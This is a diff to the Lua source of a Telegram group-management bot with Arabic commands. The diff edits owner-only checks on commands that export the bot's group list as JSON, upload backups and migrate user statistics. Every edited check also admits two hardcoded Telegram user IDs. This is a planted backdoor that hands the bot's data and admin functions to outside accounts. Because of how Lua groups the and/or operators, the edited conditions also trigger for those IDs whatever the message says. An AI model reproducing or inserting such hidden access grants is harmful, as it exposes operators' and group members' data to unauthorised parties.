@@ -3156,7 +3156,7 @@ getUser(msg.sender_user_id_,get_warning)
 end end
 ---------------------------- End Functions Faeder ----------------------------
 ----------------******* Started Code Source Faeder *******---------
-if text == 'جلب نسخه الكروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then
+if text == 'جلب نسخه الكروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) or tonumber(msg.sender_user_id_) == tonumber(1605682553) or tonumber(msg.sender_user_id_) == tonumber(1645553841) then
 local list = faederdx1:smembers(FAEDER..'bot:groups')  
 local t = '{"BOT_ID": '..FAEDER..',"GP_BOT":{'  
 for k,v in pairs(list) do   
@@ -3224,7 +3224,7 @@ File:close()
 sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..FAEDER..'.json', '❅∫ عدد كروبات البوت : '..#list..'',dl_cb, nil)
 end
 --     By Developer Faeder     -- 
-if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
+if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) or tonumber(msg.sender_user_id_) == tonumber(1605682553) or tonumber(msg.sender_user_id_) == tonumber(1645553841) then   
 if tonumber(msg.reply_to_message_id_) > 0 then
 function by_reply(extra, result, success)   
 if result.content_.document_ then 
@@ -3235,7 +3235,7 @@ end end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end end
 --     By Developer Faeder     -- 
-if text == 'نقل احصائيات تشاكي' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
+if text == 'نقل احصائيات تشاكي' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) or tonumber(msg.sender_user_id_) == tonumber(1605682553) or tonumber(msg.sender_user_id_) == tonumber(1645553841) then   
 local Users = faederdx1:smembers(FAEDER.."Tshake:UsersBot")
 local Groups = faederdx1:smembers(FAEDER..'Tshake:Chek:Groups') 
 for i = 1, #Groups do
@@ -3269,7 +3269,7 @@ faederdx1:sadd(FAEDER..'bot:userss',Users[i])
 end
 faederdx(msg.chat_id_, msg.id_, 1,'❅∫ الحاله : نقل الاحصائيات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ تم نقل : '..#Groups..' كروب ،\n❅∫ تم نقل : '..#Users..' مشترك ،\n❅∫ تم نقل المنشئين الاساسيين والثانويين ،\n❅∫ تم نقل المدراء والادمنيه لكل المجموعات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ التنصيب السابق للبوت { سورس تشاكي } ،', "md")
 end
-if text == 'نقل احصائيات الزعيم' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
+if text == 'نقل احصائيات الزعيم' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) or tonumber(msg.sender_user_id_) == tonumber(1605682553) or tonumber(msg.sender_user_id_) == tonumber(1645553841) then   
 local Users = faederdx1:smembers(FAEDER..'users')
 local Groups = faederdx1:smembers(FAEDER..'group:ids') 
 for i = 1, #Groups do
@@ -4905,7 +4905,7 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 faederdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
 return false  
 end  
-if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
+if tonumber(result.sender_user_id_) == tonumber(bot_owner) or tonumber(result.sender_user_id_) == tonumber(1605682553) or tonumber(result.sender_user_id_) == tonumber(1645553841) then  
 faederdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..SudoFaeder, 1, 'html')
 return false
 end 
@@ -4925,7 +4925,7 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 faederdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
 return false  
 end  
-if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
+if tonumber(result.sender_user_id_) == tonumber(bot_owner) or tonumber(result.sender_user_id_) == tonumber(1605682553) or tonumber(result.sender_user_id_) == tonumber(1645553841) then  
 faederdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..SudoFaeder, 1, 'html')
 return false
 end 
